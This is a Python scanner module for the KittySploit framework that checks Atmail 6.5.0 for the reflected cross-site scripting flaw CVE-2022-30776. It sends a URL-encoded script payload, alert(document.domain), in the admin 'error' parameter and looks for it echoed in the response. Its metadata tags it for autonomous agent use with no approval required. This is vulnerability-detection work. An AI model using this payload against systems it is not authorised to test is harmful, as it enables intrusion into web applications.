#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Atmail 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Atmail 6.5.0 - Cross-Site Scripting Detection',
        'description': "Atmail 6.5.0 contains a cross-site scripting vulnerability via the index.php/admin/index/ 'error' parameter.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'atmail', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://medium.com/@bhattronit96/cve-2022-30776-cd34f977c2b9',
            'https://www.atmail.com/',
            'https://help.atmail.com/hc/en-us/sections/115003283988',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-30776',
            'https://medium.com/%40bhattronit96/cve-2022-30776-cd34f977c2b9',
        ],
        'cve': 'CVE-2022-30776',
    }

    def run(self):
        r = self.http_request(method="GET", path='/atmail/index.php/admin/index/?error=1%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('Error: 1<script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Atmail 6.5.0 - Cross-Site Scripting detected",
                path='/atmail/index.php/admin/index/?error=1%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

